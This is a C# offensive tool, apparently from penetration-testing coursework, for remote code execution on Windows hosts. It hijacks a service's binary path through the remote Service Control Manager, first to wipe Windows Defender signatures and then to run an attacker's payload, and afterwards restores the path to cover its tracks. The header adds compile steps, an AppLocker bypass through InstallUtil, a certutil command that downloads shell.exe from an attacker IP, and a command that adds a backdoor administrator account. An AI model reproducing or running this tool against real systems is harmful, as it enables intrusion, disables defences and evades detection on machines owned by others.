// ================================================================
// PSLessExec.cs — Remote Code Execution via Windows Service Manager
//                 (No PowerShell Remoting Required)
// ================================================================
// WHAT THIS DOES:
//   Connects to the Service Control Manager (SCM) on a REMOTE Windows
//   machine, temporarily hijacks a service's binary path to run a command
//   of your choice, then restores the original binary path.
//
//   Execution flow:
//     1. Opens remote SCM with full access
//     2. Queries the target service's current binary path (saved for restore)
//     3. PASS 1: Sets the binary path to MpCmdRun.exe -RemoveDefinitions -All
//        (wipes Windows Defender AV signatures on the remote host)
//     4. Starts the service to run the Defender wipe
//     5. PASS 2: Sets the binary path to YOUR binary/command
//     6. Starts the service to run your command
//     7. PASS 3: Restores the original binary path (covers tracks)
//
//   This bypasses the need for PowerShell Remoting (WinRM), WMI, PsExec,
//   or any other lateral movement framework. It only requires that you
//   have admin rights on the target machine.
//
// REQUIREMENTS:
//   - You must have admin privileges on the TARGET machine
//   - The target service must accept being started (DEMAND_START)
//   - Run from a context that has network access to the target
//   - Can also be run via InstallUtil (AppLocker bypass) — see below
//
// ----------------------------------------------------------------
// COMPILE
// ----------------------------------------------------------------
//
//   OPTION A — Command line (Windows):
//     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ^
//       /unsafe /platform:x64 /out:PSLessExec.exe PSLessExec.cs
//
//     If you get "type or namespace not found" for System.Configuration.Install:
//     add /reference:System.Configuration.Install.dll to the command.
//
//   OPTION B — Visual Studio:
//     1. File -> New -> Project -> Console App (.NET Framework) -> Next
//     2. Name it "PSLessExec", Framework: .NET Framework 4.x, click Create
//     3. Properties -> Build -> Platform target: x64
//     4. Add references: right-click References -> Add Reference ->
//        Assemblies -> check System.Configuration.Install, System.Linq
//     5. Delete all code in Program.cs, paste THIS ENTIRE FILE
//     6. Build -> Build Solution (Ctrl+Shift+B)
//     7. Find: bin\x64\Debug\PSLessExec.exe
//
// ----------------------------------------------------------------
// RUN — Direct execution
// ----------------------------------------------------------------
//
//   PSLessExec.exe <Target> <Service> <BinaryToRun>
//
//   Parameters:
//     Target       -> Hostname or IP of the remote machine
//                     (e.g. appsrv01 or 192.168.1.100)
//     Service      -> Name of a service to hijack (must exist and be
//                     startable; try: sc query type= all state= all)
//                     Good choices: SensorService, SensrSvc, Browser
//     BinaryToRun  -> Full path to the .exe you want to run on the target
//                     (must already be on the target machine, or use a UNC path)
//
//   Examples:
//     PSLessExec.exe appsrv01 SensorService "C:\Users\Public\payload.exe"
//     PSLessExec.exe 192.168.1.50 Browser "C:\Windows\Temp\clrunner.exe"
//
// ----------------------------------------------------------------
// RUN — via InstallUtil (AppLocker bypass)
// ----------------------------------------------------------------
//
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe ^
//     /logfile= /LogToConsole=false ^
//     /Target=appsrv01 /Service=SensorService ^
//     /BinaryToRun="C:\Users\Public\payload.exe" ^
//     /U PSLessExec.exe
//
// USEFUL COMMANDS TO RUN ON TARGET (BinaryToRun examples):
//   Enumerate users:
//     "cmd.exe /c net user >> C:\Users\Public\out.txt"
//   Download payload from Kali:
//     "cmd.exe /c certutil -urlcache -f http://192.168.49.67/shell.exe C:\Temp\shell.exe"
//   Add user:
//     "cmd.exe /c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
//   Run your pre-dropped shellcode runner:
//     "C:\Users\Public\clrunner.exe"  (note: use InstallUtil syntax if AppLocker active)
//
// NOTES:
//   - The target .exe must already be on the remote system (upload it first via
//     a file share, SMB, or another method before calling this tool)
//   - Defender wipe (Pass 1) may take a few seconds; if it fails, continue anyway
//   - The service binary path restore (Pass 3) happens even if your payload fails
// ================================================================
using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;

namespace PSLessExec
{
    public class PSLessExec
    {
        public static uint SC_MANAGER_ALL_ACCESS = 0xF003F;
        public static uint SERVICE_ALL_ACCESS = 0xF01FF;
        public static uint SERVICE_DEMAND_START = 0x3;
        public static uint SERVICE_NO_CHANGE = 0xffffffff;

        [StructLayout(LayoutKind.Sequential)]
        public class QUERY_SERVICE_CONFIG
        {
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwServiceType;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwStartType;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwErrorControl;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpBinaryPathName;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpLoadOrderGroup;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwTagID;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpDependencies;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpServiceStartName;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpDisplayName;
        };

        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern Boolean QueryServiceConfig(IntPtr hService, IntPtr intPtrQueryConfig, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, uint dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        public static void Main(string[] args)
        {
            if (args.Length != 3)
            {
                Console.WriteLine("Usage: PSLessExec.exe [Target] [Service] [BinaryToRun]");
                Console.WriteLine("Example: PSLessExec.exe appsrv01 SensorService notepad.exe");
                return;
            }

            // Open remote SCManager
            IntPtr SCMHandle = OpenSCManager(args[0], null, SC_MANAGER_ALL_ACCESS);
            Console.WriteLine($"Got handle on SCManager on {args[0]}: {SCMHandle}.");

            // Access target service
            IntPtr schService = OpenService(SCMHandle, args[1], SERVICE_ALL_ACCESS);
            Console.WriteLine($"Got handle on target service {args[1]}: {schService}.");

            // Get current binPath (two passes, first is to determine the buffer size needed)
            UInt32 dwBytesNeeded;
            QUERY_SERVICE_CONFIG qsc = new QUERY_SERVICE_CONFIG();
            bool bResult = QueryServiceConfig(schService, IntPtr.Zero, 0, out dwBytesNeeded);
            IntPtr ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);
            bResult = QueryServiceConfig(schService, ptr, dwBytesNeeded, out dwBytesNeeded);
            Marshal.PtrToStructure(ptr, qsc);
            String binPathOrig = qsc.lpBinaryPathName;

            // Pass 1: Disable Defender signatures
            String defBypass = "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All";
             bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, defBypass, null, null, null, null, null, null);
            Console.WriteLine($"Overwrote service executable to become '{defBypass}', result: {bResult}.");

            // Run the service for Pass 1
            bResult = StartService(schService, 0, null);
            Console.WriteLine("Launched service, defender signatures should be wiped.");

            // Pass 2: Run the chosen binary
            bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, args[2], null, null, null, null, null, null);
            Console.WriteLine($"Overwrote service executable to become '{args[2]}', result: {bResult}.");

            // Run the service for Pass 2
            bResult = StartService(schService, 0, null);
            Console.WriteLine("Launched service. Check for execution!");

            // Pass 3: Restore original binPath
            bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, binPathOrig, null, null, null, null, null, null);
            Console.WriteLine($"Restored service binary to '{binPathOrig}', result: {bResult}.");
        }
    }

    // InstallUtill uninstall bypass
    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);
            List<string> argslist = new List<string>();
            string lParam1 = Convert.ToString(GetParam("Target"));
            string lParam2 = Convert.ToString(GetParam("Service"));
            string lParam3 = Convert.ToString(GetParam("BinaryToRun"));
            
            argslist.Add(lParam1);
            argslist.Add(lParam2);
            argslist.Add(lParam3);

            String[] args = argslist.ToArray();

            PSLessExec.Main(args);
        }

        private object GetParam(string p)
        {
            string[] inputvars = new string[] { "Target", "Service", "BinaryToRun" };
            try
            {
                if (this.Context != null)
                {
                    if (this.Context.Parameters[p] != null && inputvars.Contains(p))
                    {
                        string lParamValue = this.Context.Parameters[p];
                        if (lParamValue == "")
                        {
                            Console.WriteLine("You have provided a parameter that must be assigned a value: " + p);
                            System.Environment.Exit(0);
                        }
                        else if (lParamValue != null)
                            return "/" + p + ":" + lParamValue;
                    }
                    else if (this.Context.Parameters[p] != null && Array.Exists(inputvars, element => element != p))
                    {
                        string lParamValue = "/" + p;
                        return lParamValue;
                    }
                    else
                    {
                    }
                }
            }
            catch
            {
            }
            return string.Empty;
        }
    }
}